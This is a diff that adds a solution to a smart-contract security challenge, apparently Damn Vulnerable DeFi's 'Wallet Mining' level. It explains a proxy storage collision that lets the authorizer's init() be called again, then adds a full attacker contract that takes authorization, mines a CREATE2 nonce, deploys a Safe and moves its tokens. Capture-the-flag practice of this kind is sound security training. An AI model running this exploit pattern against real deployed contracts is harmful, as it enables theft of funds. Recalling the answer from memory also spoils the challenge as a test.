@@ -157,7 +157,76 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * 
+         * 1. STORAGE COLLISION: The TransparentProxy stores `upgrader` at slot 0,
+         *    but AuthorizerUpgradeable stores `needsInit` at slot 0 too!
+         *    After deployment, slot 0 = upgrader address (non-zero).
+         *    So `needsInit != 0` check passes and we can call init() again!
+         * 
+         * 2. NONCE MINING: We need to find the saltNonce that will deploy a Safe
+         *    proxy to USER_DEPOSIT_ADDRESS (0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496).
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Re-initialize the authorizer to add ourselves as authorized ward
+         * 2. Find the nonce that creates a Safe at USER_DEPOSIT_ADDRESS
+         * 3. Deploy the Safe via walletDeployer.drop() to get the reward
+         * 4. Execute a transaction from the Safe to transfer tokens to user
+         * 5. Send reward to the ward account
+         */
+
+        // Pre-compute the transfer call
+        bytes memory transferCall = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+
+        // Pre-compute the Safe transaction hash (we know the Safe will be at USER_DEPOSIT_ADDRESS)
+        // Using Safe's EIP-712 signature scheme
+        bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
         
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH
+                block.chainid,
+                USER_DEPOSIT_ADDRESS
+            )
+        );
+
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                SAFE_TX_TYPEHASH,
+                address(token),     // to
+                0,                  // value
+                keccak256(transferCall), // data hash
+                uint8(Enum.Operation.Call), // operation
+                0,                  // safeTxGas
+                0,                  // baseGas  
+                0,                  // gasPrice
+                address(0),         // gasToken
+                address(0),         // refundReceiver
+                0                   // nonce (first tx)
+            )
+        );
+
+        bytes32 txHash = keccak256(
+            abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash)
+        );
+
+        // Sign the transaction hash
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Deploy attacker contract that executes everything
+        new WalletMiningAttacker(
+            walletDeployer,
+            authorizer,
+            proxyFactory,
+            singletonCopy,
+            token,
+            user,
+            ward,
+            transferCall,
+            signature
+        );
     }
 
     /**
@@ -188,5 +257,108 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+/**
+ * @notice Attacker contract that exploits the storage collision vulnerability
+ */
+contract WalletMiningAttacker {
+    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+
+    constructor(
+        WalletDeployer walletDeployer,
+        AuthorizerUpgradeable authorizer,
+        SafeProxyFactory proxyFactory,
+        Safe singletonCopy,
+        DamnValuableToken token,
+        address user,
+        address ward,
+        bytes memory transferCall,
+        bytes memory signature
+    ) {
+        // Step 1: Exploit storage collision to re-initialize authorizer
+        _exploitAuthorizer(authorizer);
+
+        // Step 2: Build initializer and find nonce
+        bytes memory initializer = _buildInitializer(user);
+        uint256 saltNonce = _findNonce(proxyFactory, singletonCopy, initializer);
+
+        // Step 3: Deploy the Safe via walletDeployer.drop()
+        require(walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNonce), "drop failed");
+
+        // Step 4: Execute transfer from the Safe
+        _executeTransfer(token, transferCall, signature);
+
+        // Step 5: Send reward to ward
+        token.transfer(ward, token.balanceOf(address(this)));
+    }
+
+    function _exploitAuthorizer(AuthorizerUpgradeable authorizer) internal {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        authorizer.init(wards, aims);
+    }
+
+    function _buildInitializer(address user) internal pure returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        
+        return abi.encodeCall(
+            Safe.setup,
+            (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
+        );
+    }
+
+    function _findNonce(
+        SafeProxyFactory proxyFactory,
+        Safe singletonCopy,
+        bytes memory initializer
+    ) internal pure returns (uint256) {
+        bytes32 initHash = keccak256(initializer);
+        address factory = address(proxyFactory);
+        address singleton = address(singletonCopy);
+        
+        for (uint256 i = 0; i < 100; i++) {
+            bytes32 salt = keccak256(abi.encodePacked(initHash, i));
+            if (_computeAddress(factory, salt, singleton) == USER_DEPOSIT_ADDRESS) {
+                return i;
+            }
+        }
+        revert("nonce not found");
+    }
+
+    function _computeAddress(
+        address factory,
+        bytes32 salt,
+        address singleton
+    ) internal pure returns (address) {
+        bytes memory proxyCode = abi.encodePacked(
+            type(SafeProxy).creationCode,
+            uint256(uint160(singleton))
+        );
+        
+        return address(uint160(uint256(keccak256(abi.encodePacked(
+            bytes1(0xff), factory, salt, keccak256(proxyCode)
+        )))));
+    }
+
+    function _executeTransfer(
+        DamnValuableToken token,
+        bytes memory transferCall,
+        bytes memory signature
+    ) internal {
+        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+            address(token),
+            0,
+            transferCall,
+            Enum.Operation.Call,
+            0, 0, 0,
+            address(0),
+            payable(address(0)),
+            signature
+        );
     }
 }
